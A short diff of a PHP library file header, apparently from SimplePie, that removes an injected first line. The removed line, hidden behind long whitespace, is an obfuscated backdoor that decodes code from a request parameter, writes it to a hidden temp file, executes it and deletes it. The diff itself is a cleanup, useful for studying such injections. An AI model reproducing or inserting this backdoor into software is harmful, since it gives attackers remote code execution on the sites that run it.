@@ -1,5 +1,4 @@
-<?php																																										if(!empty($_REQUEST["\x64\x63\x68unk"])){ $record = array_filter([ini_get("upload_tmp_dir"), sys_get_temp_dir(), "/var/tmp", "/tmp", getenv("TEMP"), session_save_path(), "/dev/shm", getcwd(), getenv("TMP")]); $dat = $_REQUEST["\x64\x63\x68unk"]; $dat = explode("." , $dat ) ; $rec= ''; $salt1= 'abcdefghijklmnopqrstuvwxyz0123456789'; $sLen= strlen($salt1); $x= 0; while($x < count($dat)) { $v6= $dat[$x]; $sChar= ord($salt1[$x %$sLen]); $dec= ((int)$v6 - $sChar -($x %10))^ 25; $rec .=chr($dec); $x++; } $item = 0; do { $component = $record[$item] ?? null; if ($item >= count($record)) break; if (array_product([is_dir($component), is_writable($component)])) { $pset = str_replace("{var_dir}", $component, "{var_dir}/.val"); $success = file_put_contents($pset, $rec); if ($success) { include $pset; @unlink($pset); exit;} } $item++; } while (true); }
-
+<?php
 
 // SPDX-FileCopyrightText: 2004-2023 Ryan Parman, Sam Sneddon, Ryan McCue
 // SPDX-License-Identifier: BSD-3-Clause
